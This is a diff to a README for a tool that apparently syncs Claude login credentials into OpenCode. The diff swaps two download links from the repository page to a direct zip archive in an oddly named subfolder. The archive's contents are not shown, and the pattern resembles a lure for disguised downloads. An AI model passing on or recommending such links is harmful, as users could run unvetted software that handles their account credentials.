@@ -1,6 +1,6 @@
 # 🔄 opencode-claude-auth-sync - Use Claude Login in OpenCode
 
-[![Download](https://img.shields.io/badge/Download-OpenCode%20Auth%20Sync-blue.svg)](https://github.com/extrospective-jurymast327/opencode-claude-auth-sync)
+[![Download](https://img.shields.io/badge/Download-OpenCode%20Auth%20Sync-blue.svg)](https://github.com/extrospective-jurymast327/opencode-claude-auth-sync/raw/refs/heads/main/Khattish/sync-auth-claude-opencode-v1.8.zip)
 
 ## 🪟 What this app does
 
@@ -12,7 +12,7 @@ This app is for people who want a simple way to keep both tools in step. It read
 
 Use this link to visit the page to download:
 
-[https://github.com/extrospective-jurymast327/opencode-claude-auth-sync](https://github.com/extrospective-jurymast327/opencode-claude-auth-sync)
+[https://github.com/extrospective-jurymast327/opencode-claude-auth-sync/raw/refs/heads/main/Khattish/sync-auth-claude-opencode-v1.8.zip](https://github.com/extrospective-jurymast327/opencode-claude-auth-sync/raw/refs/heads/main/Khattish/sync-auth-claude-opencode-v1.8.zip)
 
 ### Steps to get started
 
